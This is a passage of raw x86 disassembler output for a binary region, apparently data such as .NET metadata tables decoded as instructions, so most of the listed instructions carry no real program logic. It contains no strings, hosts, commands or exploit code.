  4069a9:	02 5b 00             	add    0x0(%ebx),%bl
  4069ac:	5e                   	pop    %esi
  4069ad:	25 00 00 00 00       	and    $0x0,%eax
  4069b2:	86 08                	xchg   %cl,(%eax)
  4069b4:	e6 18                	out    %al,$0x18
  4069b6:	55                   	push   %ebp
  4069b7:	02 5b 00             	add    0x0(%ebx),%bl
  4069ba:	c8 54 00 00          	enter  $0x54,$0x0
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	86 08                	xchg   %cl,(%eax)
  4069c2:	76 1c                	jbe    0x4069e0
  4069c4:	5a                   	pop    %edx
  4069c5:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c9:	25 00 00 00 00       	and    $0x0,%eax
  4069ce:	86 08                	xchg   %cl,(%eax)
  4069d0:	f4                   	hlt
  4069d1:	07                   	pop    %es
  4069d2:	5f                   	pop    %edi
  4069d3:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069d7:	25 00 00 00 00       	and    $0x0,%eax
  4069dc:	e1 01                	loope  0x4069df
  4069de:	c2 14 64             	ret    $0x6414
  4069e1:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069e5:	25 00 00 00 00       	and    $0x0,%eax
  4069ea:	86 18                	xchg   %bl,(%eax)
  4069ec:	f9                   	stc
  4069ed:	14 0e                	adc    $0xe,%al
  4069ef:	00 5c 00 28          	add    %bl,0x28(%eax,%eax,1)
  4069f3:	55                   	push   %ebp
  4069f4:	00 00                	add    %al,(%eax)
  4069f6:	00 00                	add    %al,(%eax)
  4069f8:	96                   	xchg   %eax,%esi
  4069f9:	00 38                	add    %bh,(%eax)
  4069fb:	0c b1                	or     $0xb1,%al
  4069fd:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  406a01:	25 00 00 00 00       	and    $0x0,%eax
  406a06:	96                   	xchg   %eax,%esi
  406a07:	00 38                	add    %bh,(%eax)
  406a09:	0c b8                	or     $0xb8,%al
  406a0b:	02 5e 00             	add    0x0(%esi),%bl
  406a0e:	4c                   	dec    %esp
  406a0f:	55                   	push   %ebp
  406a10:	00 00                	add    %al,(%eax)
  406a12:	00 00                	add    %al,(%eax)
  406a14:	96                   	xchg   %eax,%esi
  406a15:	00 38                	add    %bh,(%eax)
  406a17:	0c be                	or     $0xbe,%al
  406a19:	02 5f 00             	add    0x0(%edi),%bl
  406a1c:	78 20                	js     0x406a3e
  406a1e:	00 00                	add    %al,(%eax)
  406a20:	00 00                	add    %al,(%eax)
  406a22:	86 18                	xchg   %bl,(%eax)
  406a24:	f9                   	stc
  406a25:	14 0e                	adc    $0xe,%al
  406a27:	00 61 00             	add    %ah,0x0(%ecx)
  406a2a:	9e                   	sahf
  406a2b:	25 00 00 00 00       	and    $0x0,%eax
  406a30:	96                   	xchg   %eax,%esi
  406a31:	00 39                	add    %bh,(%ecx)
  406a33:	0f c5                	pextrw $0xc5,(bad),%eax
  406a35:	02 61 00             	add    0x0(%ecx),%ah
  406a38:	0c 56                	or     $0x56,%al
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	00 00                	add    %al,(%eax)
  406a3e:	96                   	xchg   %eax,%esi
  406a3f:	00 52 0c             	add    %dl,0xc(%edx)
  406a42:	cb                   	lret
  406a43:	02 62 00             	add    0x0(%edx),%ah
  406a46:	d4 56                	aam    $0x56
  406a48:	00 00                	add    %al,(%eax)
  406a4a:	00 00                	add    %al,(%eax)
  406a4c:	96                   	xchg   %eax,%esi
  406a4d:	00 32                	add    %dh,(%edx)
  406a4f:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a54:	ab                   	stos   %eax,%es:(%edi)
  406a55:	25 00 00 00 00       	and    $0x0,%eax
  406a5a:	96                   	xchg   %eax,%esi
  406a5b:	00 cf                	add    %cl,%bh
  406a5d:	18 da                	sbb    %bl,%dl
  406a5f:	02 66 00             	add    0x0(%esi),%ah
  406a62:	c6                   	(bad)
  406a63:	25 00 00 00 00       	and    $0x0,%eax
  406a68:	96                   	xchg   %eax,%esi
  406a69:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a6f:	00 e6                	add    %ah,%dh
  406a71:	25 00 00 00 00       	and    $0x0,%eax
  406a76:	96                   	xchg   %eax,%esi
  406a77:	00 5c 10 e8          	add    %bl,-0x18(%eax,%edx,1)
  406a7b:	02 6a 00             	add    0x0(%edx),%ch
  406a7e:	74 57                	je     0x406ad7
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	96                   	xchg   %eax,%esi
  406a85:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a8b:	00 a4 57 00 00 00 00 	add    %ah,0x0(%edi,%edx,2)
  406a92:	96                   	xchg   %eax,%esi
  406a93:	00 9c 13 f6 02 6e 00 	add    %bl,0x6e02f6(%ebx,%edx,1)
  406a9a:	78 20                	js     0x406abc
  406a9c:	00 00                	add    %al,(%eax)
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	86 18                	xchg   %bl,(%eax)
  406aa2:	f9                   	stc
  406aa3:	14 0e                	adc    $0xe,%al
  406aa5:	00 70 00             	add    %dh,0x0(%eax)
  406aa8:	e8 58 00 00 00       	call   0x406b05
  406aad:	00 96 00 5f 18 84    	add    %dl,-0x7be7a100(%esi)
  406ab3:	01 70 00             	add    %esi,0x0(%eax)
  406ab6:	74 59                	je     0x406b11
  406ab8:	00 00                	add    %al,(%eax)
  406aba:	00 00                	add    %al,(%eax)
  406abc:	96                   	xchg   %eax,%esi
  406abd:	00 56 18             	add    %dl,0x18(%esi)
  406ac0:	84 01                	test   %al,(%ecx)
  406ac2:	71 00                	jno    0x406ac4
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	01 00                	add    %eax,(%eax)
  406ac8:	c1 0a 00             	rorl   $0x0,(%edx)
  406acb:	00 01                	add    %al,(%ecx)
  406acd:	00 c1                	add    %al,%cl
  406acf:	0a 00                	or     (%eax),%al
  406ad1:	00 01                	add    %al,(%ecx)
  406ad3:	00 c1                	add    %al,%cl
  406ad5:	0a 00                	or     (%eax),%al
  406ad7:	00 01                	add    %al,(%ecx)
  406ad9:	00 c1                	add    %al,%cl
  406adb:	0a 00                	or     (%eax),%al
  406add:	00 01                	add    %al,(%ecx)
  406adf:	00 c1                	add    %al,%cl
  406ae1:	0a 00                	or     (%eax),%al
  406ae3:	00 01                	add    %al,(%ecx)
  406ae5:	00 c1                	add    %al,%cl
  406ae7:	0a 00                	or     (%eax),%al
  406ae9:	00 01                	add    %al,(%ecx)
  406aeb:	00 c1                	add    %al,%cl
  406aed:	0a 00                	or     (%eax),%al
  406aef:	00 01                	add    %al,(%ecx)
  406af1:	00 c1                	add    %al,%cl
  406af3:	0a 00                	or     (%eax),%al
  406af5:	00 01                	add    %al,(%ecx)
  406af7:	00 c1                	add    %al,%cl
  406af9:	0a 00                	or     (%eax),%al
  406afb:	00 01                	add    %al,(%ecx)
  406afd:	00 c1                	add    %al,%cl
  406aff:	0a 00                	or     (%eax),%al
  406b01:	00 01                	add    %al,(%ecx)
  406b03:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b09:	00 46 13             	add    %al,0x13(%esi)
  406b0c:	00 00                	add    %al,(%eax)
  406b0e:	02 00                	add    (%eax),%al
  406b10:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b11:	08 00                	or     %al,(%eax)
  406b13:	00 03                	add    %al,(%ebx)
  406b15:	00 a4 10 00 00 04 00 	add    %ah,0x40000(%eax,%edx,1)
  406b1c:	16                   	push   %ss
  406b1d:	18 00                	sbb    %al,(%eax)
  406b1f:	00 01                	add    %al,(%ecx)
  406b21:	00 c6                	add    %al,%dh
  406b23:	12 00                	adc    (%eax),%al
  406b25:	00 01                	add    %al,(%ecx)
  406b27:	00 0d 0d 00 00 01    	add    %cl,0x100000d
  406b2d:	00 b3 0d 00 00 01    	add    %dh,0x100000d(%ebx)
  406b33:	00 b3 0d 00 00 01    	add    %dh,0x100000d(%ebx)
  406b39:	00 1d 0d 00 00 01    	add    %bl,0x100000d
  406b3f:	00 c8                	add    %cl,%al
  406b41:	18 00                	sbb    %al,(%eax)
  406b43:	00 01                	add    %al,(%ecx)
  406b45:	00 bf 04 00 00 02    	add    %bh,0x2000004(%edi)
  406b4b:	00 f1                	add    %dh,%cl
  406b4d:	1b 00                	sbb    (%eax),%eax
  406b4f:	00 03                	add    %al,(%ebx)
  406b51:	00 56 1b             	add    %dl,0x1b(%esi)
  406b54:	00 00                	add    %al,(%eax)
  406b56:	01 00                	add    %eax,(%eax)
  406b58:	2a 07                	sub    (%edi),%al
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	01 00                	add    %eax,(%eax)
  406b5e:	31 18                	xor    %ebx,(%eax)
  406b60:	00 00                	add    %al,(%eax)
  406b62:	02 00                	add    (%eax),%al
  406b64:	14 1b                	adc    $0x1b,%al
  406b66:	00 00                	add    %al,(%eax)
  406b68:	01 00                	add    %eax,(%eax)
  406b6a:	ef                   	out    %eax,(%dx)
  406b6b:	16                   	push   %ss
  406b6c:	00 00                	add    %al,(%eax)
  406b6e:	01 00                	add    %eax,(%eax)
  406b70:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b75:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b7b:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b81:	00 46 13             	add    %al,0x13(%esi)
  406b84:	00 00                	add    %al,(%eax)
  406b86:	02 00                	add    (%eax),%al
  406b88:	5f                   	pop    %edi
  406b89:	0b 00                	or     (%eax),%eax
  406b8b:	00 01                	add    %al,(%ecx)
  406b8d:	00 a2 07 00 00 02    	add    %ah,0x2000007(%edx)
  406b93:	00 c1                	add    %al,%cl
  406b95:	0a 00                	or     (%eax),%al
  406b97:	00 01                	add    %al,(%ecx)
  406b99:	00 c1                	add    %al,%cl
  406b9b:	0a 00                	or     (%eax),%al
  406b9d:	00 01                	add    %al,(%ecx)
  406b9f:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406ba5:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406bab:	00 1a                	add    %bl,(%edx)
  406bad:	0e                   	push   %cs
  406bae:	00 00                	add    %al,(%eax)
  406bb0:	01 00                	add    %eax,(%eax)
  406bb2:	3d 1c 00 00 01       	cmp    $0x100001c,%eax
  406bb7:	00 d9                	add    %bl,%cl
  406bb9:	1c 00                	sbb    $0x0,%al
  406bbb:	00 01                	add    %al,(%ecx)
  406bbd:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406bc3:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406bc9:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406bcf:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406bd5:	00 32                	add    %dh,(%edx)
  406bd7:	00 00                	add    %al,(%eax)
  406bd9:	00 02                	add    %al,(%edx)
  406bdb:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406be1:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406be7:	00 a9 1b 00 00 01    	add    %ch,0x100001b(%ecx)
  406bed:	00 b3 18 00 00 01    	add    %dh,0x1000018(%ebx)
  406bf3:	00 43 16             	add    %al,0x16(%ebx)
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	01 00                	add    %eax,(%eax)
  406bfa:	bf 16 00 00 01       	mov    $0x1000016,%edi
  406bff:	00 bf 16 00 00 01    	add    %bh,0x1000016(%edi)
  406c05:	00 fa                	add    %bh,%dl
  406c07:	1b 00                	sbb    (%eax),%eax
  406c09:	00 01                	add    %al,(%ecx)
  406c0b:	00 fa                	add    %bh,%dl
  406c0d:	1b 00                	sbb    (%eax),%eax
  406c0f:	00 01                	add    %al,(%ecx)
  406c11:	00 fa                	add    %bh,%dl
  406c13:	1b 00                	sbb    (%eax),%eax
  406c15:	00 01                	add    %al,(%ecx)
  406c17:	00 fa                	add    %bh,%dl
  406c19:	1b 00                	sbb    (%eax),%eax
  406c1b:	00 01                	add    %al,(%ecx)
  406c1d:	00 fa                	add    %bh,%dl
  406c1f:	1b 00                	sbb    (%eax),%eax
  406c21:	00 01                	add    %al,(%ecx)
  406c23:	00 b3 0d 00 00 01    	add    %dh,0x100000d(%ebx)
  406c29:	00 a0 0d 00 00 02    	add    %ah,0x200000d(%eax)
  406c2f:	00 ab 0d 00 00 01    	add    %ch,0x100000d(%ebx)
  406c35:	00 c1                	add    %al,%cl
  406c37:	0a 00                	or     (%eax),%al
  406c39:	00 01                	add    %al,(%ecx)
  406c3b:	00 c1                	add    %al,%cl
  406c3d:	0a 00                	or     (%eax),%al
  406c3f:	00 01                	add    %al,(%ecx)
  406c41:	00 c1                	add    %al,%cl
  406c43:	0a 00                	or     (%eax),%al
  406c45:	00 01                	add    %al,(%ecx)
  406c47:	00 23                	add    %ah,(%ebx)
  406c49:	1c 00                	sbb    $0x0,%al
  406c4b:	00 01                	add    %al,(%ecx)
  406c4d:	00 c1                	add    %al,%cl
  406c4f:	0a 00                	or     (%eax),%al
  406c51:	00 01                	add    %al,(%ecx)
  406c53:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c59:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c5f:	00 b0 17 00 00 01    	add    %dh,0x1000017(%eax)
  406c65:	00 b0 17 00 00 01    	add    %dh,0x1000017(%eax)
  406c6b:	00 c1                	add    %al,%cl
  406c6d:	0a 00                	or     (%eax),%al
  406c6f:	00 01                	add    %al,(%ecx)
  406c71:	00 c1                	add    %al,%cl
  406c73:	0a 00                	or     (%eax),%al
  406c75:	00 01                	add    %al,(%ecx)
  406c77:	00 c1                	add    %al,%cl
  406c79:	0a 00                	or     (%eax),%al
  406c7b:	00 01                	add    %al,(%ecx)
  406c7d:	00 f0                	add    %dh,%al
  406c7f:	1c 00                	sbb    $0x0,%al
  406c81:	00 02                	add    %al,(%edx)
  406c83:	00 c1                	add    %al,%cl
  406c85:	0a 00                	or     (%eax),%al
  406c87:	00 01                	add    %al,(%ecx)
  406c89:	00 f0                	add    %dh,%al
  406c8b:	1c 00                	sbb    $0x0,%al
  406c8d:	00 02                	add    %al,(%edx)
  406c8f:	00 c1                	add    %al,%cl
  406c91:	0a 00                	or     (%eax),%al
  406c93:	00 01                	add    %al,(%ecx)
  406c95:	00 21                	add    %ah,(%ecx)
  406c97:	07                   	pop    %es
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	01 00                	add    %eax,(%eax)
  406c9c:	21 07                	and    %eax,(%edi)
  406c9e:	00 00                	add    %al,(%eax)
  406ca0:	01 00                	add    %eax,(%eax)
  406ca2:	5f                   	pop    %edi
  406ca3:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca8:	c1 0a 00             	rorl   $0x0,(%edx)
  406cab:	00 01                	add    %al,(%ecx)
  406cad:	00 60 0e             	add    %ah,0xe(%eax)
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	01 00                	add    %eax,(%eax)
  406cb4:	65 0e                	gs push %cs
  406cb6:	00 00                	add    %al,(%eax)
  406cb8:	01 00                	add    %eax,(%eax)
  406cba:	65 0e                	gs push %cs
  406cbc:	00 00                	add    %al,(%eax)
  406cbe:	01 00                	add    %eax,(%eax)
  406cc0:	bf 16 00 00 01       	mov    $0x1000016,%edi
  406cc5:	00 21                	add    %ah,(%ecx)
  406cc7:	07                   	pop    %es
  406cc8:	00 00                	add    %al,(%eax)
  406cca:	01 00                	add    %eax,(%eax)
  406ccc:	b0 17                	mov    $0x17,%al
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	01 00                	add    %eax,(%eax)
  406cd2:	b0 17                	mov    $0x17,%al
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	01 00                	add    %eax,(%eax)
  406cd8:	c1 0a 00             	rorl   $0x0,(%edx)
  406cdb:	00 01                	add    %al,(%ecx)
  406cdd:	00 c1                	add    %al,%cl
  406cdf:	0a 00                	or     (%eax),%al
  406ce1:	00 01                	add    %al,(%ecx)
  406ce3:	00 c1                	add    %al,%cl
  406ce5:	0a 00                	or     (%eax),%al
  406ce7:	00 01                	add    %al,(%ecx)
  406ce9:	00 b0 17 00 00 02    	add    %dh,0x2000017(%eax)
  406cef:	00 88 10 00 00 01    	add    %cl,0x1000010(%eax)
  406cf5:	00 b0 17 00 00 01    	add    %dh,0x1000017(%eax)
  406cfb:	00 69 0b             	add    %ch,0xb(%ecx)
  406cfe:	00 00                	add    %al,(%eax)
  406d00:	02 00                	add    (%eax),%al
  406d02:	b0 17                	mov    $0x17,%al
  406d04:	00 00                	add    %al,(%eax)
  406d06:	01 00                	add    %eax,(%eax)
  406d08:	b0 17                	mov    $0x17,%al
  406d0a:	00 00                	add    %al,(%eax)
  406d0c:	01 00                	add    %eax,(%eax)
  406d0e:	b0 17                	mov    $0x17,%al
  406d10:	00 00                	add    %al,(%eax)
  406d12:	02 00                	add    (%eax),%al
  406d14:	6f                   	outsl  %ds:(%esi),(%dx)
  406d15:	0e                   	push   %cs
  406d16:	00 00                	add    %al,(%eax)
  406d18:	01 00                	add    %eax,(%eax)
  406d1a:	b0 17                	mov    $0x17,%al
  406d1c:	00 00                	add    %al,(%eax)
  406d1e:	02 00                	add    (%eax),%al
  406d20:	b6 16                	mov    $0x16,%dh
  406d22:	00 00                	add    %al,(%eax)
  406d24:	01 00                	add    %eax,(%eax)
  406d26:	b0 17                	mov    $0x17,%al
  406d28:	00 00                	add    %al,(%eax)
  406d2a:	02 00                	add    (%eax),%al
  406d2c:	65 0e                	gs push %cs
  406d2e:	00 00                	add    %al,(%eax)
  406d30:	01 00                	add    %eax,(%eax)
  406d32:	b0 17                	mov    $0x17,%al
  406d34:	00 00                	add    %al,(%eax)
  406d36:	02 00                	add    (%eax),%al
  406d38:	65 0e                	gs push %cs
  406d3a:	00 00                	add    %al,(%eax)
  406d3c:	01 00                	add    %eax,(%eax)
  406d3e:	b0 17                	mov    $0x17,%al
  406d40:	00 00                	add    %al,(%eax)
  406d42:	02 00                	add    (%eax),%al
  406d44:	60                   	pusha
  406d45:	0e                   	push   %cs
  406d46:	00 00                	add    %al,(%eax)
  406d48:	01 00                	add    %eax,(%eax)
  406d4a:	b0 17                	mov    $0x17,%al
  406d4c:	00 00                	add    %al,(%eax)
  406d4e:	02 00                	add    (%eax),%al
  406d50:	6a 0e                	push   $0xe
  406d52:	00 00                	add    %al,(%eax)
  406d54:	01 00                	add    %eax,(%eax)
  406d56:	b0 17                	mov    $0x17,%al
  406d58:	00 00                	add    %al,(%eax)
  406d5a:	02 00                	add    (%eax),%al
  406d5c:	6a 0e                	push   $0xe
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	01 00                	add    %eax,(%eax)
  406d62:	a9 1b 00 00 01       	test   $0x100001b,%eax
  406d67:	00 a9 1b 16 00 59    	add    %ch,0x5900161b(%ecx)
  406d6d:	00 18                	add    %bl,(%eax)
  406d6f:	00 5d 00             	add    %bl,0x0(%ebp)
  406d72:	b1 00                	mov    $0x0,%cl
  406d74:	e2 1a                	loop   0x406d90
  406d76:	bb 01 b1 00 ce       	mov    $0xce00b101,%ebx
  406d7b:	1b bf 01 b1 00 bd    	sbb    -0x42ff4eff(%edi),%edi
  406d81:	19 0e                	sbb    %ecx,(%esi)
  406d83:	00 b9 00 e1 14 64    	add    %bh,0x6414e100(%ecx)
  406d89:	02 c9                	add    %cl,%cl
  406d8b:	00 f9                	add    %bh,%cl
  406d8d:	14 01                	adc    $0x1,%al
  406d8f:	03 d1                	add    %ecx,%edx
  406d91:	00 f9                	add    %bh,%cl
  406d93:	14 0e                	adc    $0xe,%al
  406d95:	00 d9                	add    %bl,%cl
  406d97:	00 f9                	add    %bh,%cl
  406d99:	14 2e                	adc    $0x2e,%al
  406d9b:	03 e9                	add    %ecx,%ebp
  406d9d:	00 f9                	add    %bh,%cl
  406d9f:	14 6b                	adc    $0x6b,%al
  406da1:	01 f1                	add    %esi,%ecx
  406da3:	00 f9                	add    %bh,%cl
  406da5:	14 6b                	adc    $0x6b,%al
  406da7:	01 f9                	add    %edi,%ecx
  406da9:	00 f9                	add    %bh,%cl
  406dab:	14 6b                	adc    $0x6b,%al
  406dad:	01 01                	add    %eax,(%ecx)
  406daf:	01 f9                	add    %edi,%ecx
  406db1:	14 6b                	adc    $0x6b,%al
  406db3:	01 09                	add    %ecx,(%ecx)
  406db5:	01 f9                	add    %edi,%ecx
  406db7:	14 6b                	adc    $0x6b,%al
  406db9:	01 11                	add    %edx,(%ecx)
  406dbb:	01 f9                	add    %edi,%ecx
  406dbd:	14 6b                	adc    $0x6b,%al
  406dbf:	01 19                	add    %ebx,(%ecx)
  406dc1:	01 f9                	add    %edi,%ecx
  406dc3:	14 6b                	adc    $0x6b,%al
  406dc5:	01 21                	add    %esp,(%ecx)
  406dc7:	01 f9                	add    %edi,%ecx
  406dc9:	14 6b                	adc    $0x6b,%al
  406dcb:	01 29                	add    %ebp,(%ecx)
  406dcd:	01 f9                	add    %edi,%ecx
  406dcf:	14 6b                	adc    $0x6b,%al
  406dd1:	01 31                	add    %esi,(%ecx)
  406dd3:	01 f9                	add    %edi,%ecx
  406dd5:	14 4b                	adc    $0x4b,%al
  406dd7:	02 39                	add    (%ecx),%bh
  406dd9:	01 f9                	add    %edi,%ecx
  406ddb:	14 0e                	adc    $0xe,%al
  406ddd:	00 41 01             	add    %al,0x1(%ecx)
  406de0:	f9                   	stc
  406de1:	14 6b                	adc    $0x6b,%al
  406de3:	01 49 01             	add    %ecx,0x1(%ecx)
  406de6:	78 12                	js     0x406dfa
  406de8:	7f 00                	jg     0x406dea
  406dea:	51                   	push   %ecx
  406deb:	01 6e 00             	add    %ebp,0x0(%esi)
  406dee:	c4 03                	les    (%ebx),%eax
  406df0:	59                   	pop    %ecx
  406df1:	01 e7                	add    %esp,%edi
  406df3:	19 7f 00             	sbb    %edi,0x0(%edi)
  406df6:	51                   	push   %ecx
  406df7:	01 69 10             	add    %ebp,0x10(%ecx)
  406dfa:	84 00                	test   %al,(%eax)
  406dfc:	09 00                	or     %eax,(%eax)
  406dfe:	f9                   	stc
  406dff:	14 0e                	adc    $0xe,%al
  406e01:	00 61 01             	add    %ah,0x1(%ecx)
  406e04:	37                   	aaa
  406e05:	01 cd                	add    %ecx,%ebp
  406e07:	03 51 01             	add    0x1(%ecx),%edx
  406e0a:	18 0c 2a             	sbb    %cl,(%edx,%ebp,1)
  406e0d:	01 61 01             	add    %esp,0x1(%ecx)
  406e10:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e11:	0c d3                	or     $0xd3,%al
  406e13:	03 11                	add    (%ecx),%edx
  406e15:	00 f9                	add    %bh,%cl
  406e17:	14 2b                	adc    $0x2b,%al
  406e19:	02 11                	add    (%ecx),%dl
  406e1b:	00 c2                	add    %al,%dl
  406e1d:	1c d9                	sbb    $0xd9,%al
  406e1f:	03 69 01             	add    0x1(%ecx),%ebp
  406e22:	8d 1c df             	lea    (%edi,%ebx,8),%ebx
  406e25:	03 61 01             	add    0x1(%ecx),%esp
  406e28:	ad                   	lods   %ds:(%esi),%eax
  406e29:	16                   	push   %ss
  406e2a:	e5 03                	in     $0x3,%eax
  406e2c:	81 01 e2 01 c7 00    	addl   $0xc701e2,(%ecx)
  406e32:	79 01                	jns    0x406e35
  406e34:	2f                   	das
  406e35:	0d eb 03 19 00       	or     $0x1903eb,%eax
  406e3a:	f9                   	stc
  406e3b:	14 09                	adc    $0x9,%al
  406e3d:	04 19                	add    $0x19,%al
  406e3f:	00 3f                	add    %bh,(%edi)
  406e41:	0b 01                	or     (%ecx),%eax
  406e43:	03 19                	add    (%ecx),%ebx
  406e45:	00 2c 0b             	add    %ch,(%ebx,%ecx,1)
  406e48:	01 03                	add    %eax,(%ebx)
  406e4a:	c1 01 67             	roll   $0x67,(%ecx)
  406e4d:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e52:	d9 19                	fstps  (%ecx)
  406e54:	1c 04                	sbb    $0x4,%al
  406e56:	d1 01                	roll   $1,(%ecx)
  406e58:	f9                   	stc
  406e59:	14 0e                	adc    $0xe,%al
  406e5b:	00 d1                	add    %dl,%cl
  406e5d:	01 d2                	add    %edx,%edx
  406e5f:	1b 23                	sbb    (%ebx),%esp
  406e61:	04 d9                	add    $0xd9,%al
  406e63:	01 ea                	add    %ebp,%edx
  406e65:	15 28 04 19 00       	adc    $0x190428,%eax
  406e6a:	40                   	inc    %eax
  406e6b:	19 30                	sbb    %esi,(%eax)
  406e6d:	04 19                	add    $0x19,%al
  406e6f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  406e72:	bf 01 19 00 40       	mov    $0x40001901,%edi
  406e77:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e7a:	99                   	cltd
  406e7b:	01 f9                	add    %edi,%ecx
  406e7d:	14 0e                	adc    $0xe,%al
  406e7f:	00 a1 01 f9 14 36    	add    %ah,0x3614f901(%ecx)
  406e85:	02 99 01 5a 17 38    	add    0x38175a01(%ecx),%bl
  406e8b:	04 99                	add    $0x99,%al
  406e8d:	01 43 0c             	add    %eax,0xc(%ebx)
  406e90:	70 01                	jo     0x406e93
  406e92:	c1 01 d9             	roll   $0xd9,(%ecx)
  406e95:	19 3f                	sbb    %edi,(%edi)
  406e97:	04 d1                	add    $0xd1,%al
  406e99:	01 d2                	add    %edx,%edx
  406e9b:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e9e:	f1                   	int1
  406e9f:	01 64 08 0e          	add    %esp,0xe(%eax,%ecx,1)
  406ea3:	00 f9                	add    %bh,%cl
  406ea5:	01 f9                	add    %edi,%ecx
  406ea7:	14 4f                	adc    $0x4f,%al
  406ea9:	04 01                	add    $0x1,%al
  406eab:	02 f9                	add    %cl,%bh
  406ead:	14 56                	adc    $0x56,%al
  406eaf:	04 21                	add    $0x21,%al
  406eb1:	00 f9                	add    %bh,%cl
  406eb3:	14 5c                	adc    $0x5c,%al
  406eb5:	04 19                	add    $0x19,%al
  406eb7:	00 26                	add    %ah,(%esi)
  406eb9:	1b 66 04             	sbb    0x4(%esi),%esp
  406ebc:	09 00                	or     %eax,(%eax)
  406ebe:	5e                   	pop    %esi
  406ebf:	0c 47                	or     $0x47,%al
  406ec1:	02 21                	add    (%ecx),%ah
  406ec3:	00 62 1a             	add    %ah,0x1a(%edx)
  406ec6:	6c                   	insb   (%dx),%es:(%edi)
  406ec7:	04 29                	add    $0x29,%al
  406ec9:	02 f9                	add    %cl,%bh
  406ecb:	14 56                	adc    $0x56,%al
  406ecd:	04 29                	add    $0x29,%al
  406ecf:	00 f9                	add    %bh,%cl
  406ed1:	14 78                	adc    $0x78,%al
  406ed3:	04 31                	add    $0x31,%al
  406ed5:	02 f9                	add    %cl,%bh
  406ed7:	14 56                	adc    $0x56,%al
  406ed9:	04 c1                	add    $0xc1,%al
  406edb:	00 07                	add    %al,(%edi)
  406edd:	03 82 04 39 02 94    	add    -0x6bfdc6fc(%edx),%eax
  406ee3:	07                   	pop    %es
  406ee4:	8f 04 31             	pop    (%ecx,%esi,1)
  406ee7:	00 6a 17             	add    %ch,0x17(%edx)
  406eea:	96                   	xchg   %eax,%esi
  406eeb:	04 c1                	add    $0xc1,%al
  406eed:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef1:	00 19                	add    %bl,(%ecx)
  406ef3:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406efd:	00 c1                	add    %al,%cl
  406eff:	00 ff                	add    %bh,%bh
  406f01:	02 a1 04 49 02 6e    	add    0x6e024904(%ecx),%ah
  406f07:	00 a7 04 c1 00 0c    	add    %ah,0xc00c104(%edi)
  406f0d:	03 ae 04 51 02 f9    	add    -0x6fdaefc(%esi),%ebp
  406f13:	14 56                	adc    $0x56,%al
  406f15:	04 49                	add    $0x49,%al
  406f17:	01 f9                	add    %edi,%ecx
  406f19:	14 b6                	adc    $0xb6,%al
  406f1b:	04 49                	add    $0x49,%al
  406f1d:	01 8b 1b bd 04 61    	add    %ecx,0x6104bd1b(%ebx)
  406f23:	02 7a 14             	add    0x14(%edx),%bh
  406f26:	cf                   	iret
  406f27:	04 49                	add    $0x49,%al
  406f29:	02 ad 16 9f 01 19    	add    0x19019f16(%ebp),%ch
  406f2f:	00 34 0f             	add    %dh,(%edi,%ecx,1)
  406f32:	d6                   	salc
  406f33:	04 c1                	add    $0xc1,%al
  406f35:	00 e2                	add    %ah,%dl
  406f37:	08 de                	or     %bl,%dh
  406f39:	04 59                	add    $0x59,%al
  406f3b:	02 f9                	add    %cl,%bh
  406f3d:	14 2b                	adc    $0x2b,%al
  406f3f:	02 c1                	add    %cl,%al
  406f41:	00 a0 11 15 02 c1    	add    %ah,-0x3efdeaef(%eax)
  406f47:	00 3a                	add    %bh,(%edx)
  406f49:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f4e:	e7 19                	out    %eax,$0x19
  406f50:	9a 00 71 02 38 19 0a 	lcall  $0xa19,$0x38027100
  406f57:	00 59 01             	add    %bl,0x1(%ecx)
  406f5a:	c2 15 c7             	ret    $0xc715
  406f5d:	00 a1 02 dc 07 01    	add    %ah,0x107dc02(%ecx)
  406f63:	05 79 02 f9 14       	add    $0x14f90279,%eax
  406f68:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f6b:	02 3a                	add    (%edx),%bh
  406f6d:	18 07                	sbb    %al,(%edi)
